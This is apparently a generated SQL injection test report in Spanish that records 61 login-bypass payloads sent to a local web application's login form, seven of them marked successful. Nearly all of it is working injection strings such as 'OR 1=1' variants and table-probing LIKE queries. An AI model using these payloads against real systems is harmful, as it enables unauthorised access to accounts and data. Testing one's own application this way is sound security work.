@@ -1,0 +1,140 @@
+DETALLES DE LA PRUEBA DE INYECCIÓN SQL: INICIO DE SESIÓN
+
+
+Fecha y Hora de Creación: 11/05/2016 07:36:38 PM
+Usuario: RYUKZ (Administrador)
+
+URL Destino del Formulario: http://localhost/sirah/
+Mensaje de Respuesta Invalido: Usuario o contraseña incorrecto
+
+INTENTOS: 
+
+1 => Fallido: [username=mb1' or 1=1 ORDER BY estatus DESC; --][password=mA123aad222][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+2 => Fallido: [username=ma1' or 1=1 ORDER BY status DESC; --][password=mA123aad222][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+3 => Fallido: [username=or 1=1 --][password=or 1=1 #][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+4 => Fallido: [username=' OR '1'='1][password=' OR '1'='1 ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+5 => Fallido: [username=' OR '1'='1][password=m2' OR '1'='1 ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+6 => Fallido: [username=AND user is TRUE; --][password=AND user is TRUE; -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+7 => Fallido: [username=' OR user LIKE '%a%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+8 => Fallido: [username=' OR user LIKE '%e%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+9 => Fallido: [username=' OR user LIKE '%i%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+10 => Fallido: [username=' OR user LIKE '%o%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+11 => Fallido: [username=' OR user LIKE '%u%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+12 => Exitoso: [username=' OR usuario LIKE '%a%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+13 => Exitoso: [username=' OR usuario LIKE '%e%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+14 => Exitoso: [username=' OR usuario LIKE '%i%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+15 => Exitoso: [username=' OR usuario LIKE '%o%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+16 => Exitoso: [username=' OR usuario LIKE '%u%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+17 => Fallido: [username=' OR nombre LIKE '%a%'; --][password=' AND 1=(SELECT COUNT(*) FROM nombre); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+18 => Fallido: [username=' OR nombre LIKE '%e%'; --][password=' AND 1=(SELECT COUNT(*) FROM nombre); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+19 => Fallido: [username=' OR nombre LIKE '%i%'; --][password=' AND 1=(SELECT COUNT(*) FROM nombre); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+20 => Fallido: [username=' OR nombre LIKE '%o%'; --][password=' AND 1=(SELECT COUNT(*) FROM nombre); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+21 => Fallido: [username=' OR nombre LIKE '%u%'; --][password=' AND 1=(SELECT COUNT(*) FROM nombre); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+22 => Fallido: [username=' OR name LIKE '%a%'; --][password=' AND 1=(SELECT COUNT(*) FROM name); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+23 => Fallido: [username=' OR name LIKE '%e%'; --][password=' AND 1=(SELECT COUNT(*) FROM name); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+24 => Fallido: [username=' OR name LIKE '%i%'; --][password=' AND 1=(SELECT COUNT(*) FROM name); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+25 => Fallido: [username=' OR name LIKE '%o%'; --][password=' AND 1=(SELECT COUNT(*) FROM name); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+26 => Fallido: [username=' OR name LIKE '%u%'; --][password=' AND 1=(SELECT COUNT(*) FROM name); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+27 => Fallido: [username=' OR 1>=(SELECT COUNT(*) FROM nombre); --][password=' OR 1>=(SELECT COUNT(*) FROM nombre); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+28 => Fallido: [username=' OR 1>=(SELECT COUNT(*) FROM nombre); #][password=' OR 1>=(SELECT COUNT(*) FROM nombre); # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+29 => Exitoso: [username=' or 1=1;][password=' or 1=1;][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+30 => Fallido: [username=' or ''='][password= ' or ''='][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+31 => Fallido: [username=' or ' '='][password= ' or ' '='][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+32 => Fallido: [username=' or true--][password= ' or true--][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+33 => Fallido: [username=" or true--][password= " or true-- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+34 => Fallido: [username=" or ""="][password= " or ""="][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+35 => Fallido: [username=" or 1--][password= " or 1-- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+36 => Fallido: [username=' or 'x'='x][password=' or 'x'='x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+37 => Fallido: [username=' or 0=0 --][password=' or 0=0 -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+38 => Fallido: [username=" or 0=0 --][password=or 0=0 -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+39 => Fallido: [username=or 0=0 --][password=' or 0=0 # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+40 => Fallido: [username=][password=" or 0=0 # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+41 => Fallido: [username=][password=or 0=0 # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+42 => Fallido: [username=][password=" or "x"="x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+43 => Fallido: [username=][password=') or ('x'='x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+44 => Fallido: [username=' or 1=1--][password=" or 1=1-- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+45 => Fallido: [username=or 1=1--][password=or 1=1-- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+46 => Fallido: [username=' or a=a--][password=" or "a"="a][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+47 => Fallido: [username=hi" or "a"="a][password=hi" or 1=1 --][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+48 => Fallido: [username=hi' or 1=1 --][password='or'1=1'][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+49 => Fallido: [username=and 1=1--][password=and 1=1][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+50 => Fallido: [username=' or 'one'='one][password=' and 'one'='one][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+51 => Fallido: [username=' or 'one'='one--][password=' and 'one'='one--][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+52 => Fallido: [username=admin' --][password=admin' # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+53 => Fallido: [username=or 1=1--][password=or 1=1 # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+54 => Fallido: [username=' or '1'='1][password=' or 'x'='x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+55 => Fallido: [username=' or 0=0 --][password=" or 0=0 --][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+56 => Exitoso: [username=' or 0=0 #][password=" or 0=0 #][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+57 => Fallido: [username=or 0=0 #][password=or 0=0 #][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+58 => Fallido: [username=' or 'x'='x][password=" or "x"="x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+59 => Fallido: [username=' or a=a--][password=" or "a"="a][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+60 => Fallido: [username=hi" or "a"="a][password=hi" or "a"="a][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+61 => Fallido: [username='or' 1=1'][password='or' 1=1'][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+
+
+TOTAL DE INTENTOS: 61
+INTENTOS EXITOSOS: 7 (12,13,14,15,16,29,56)
+INTENTOS FALLIDOS: 54
+
+Tiempo de Ejecución: 2.1229 segundos
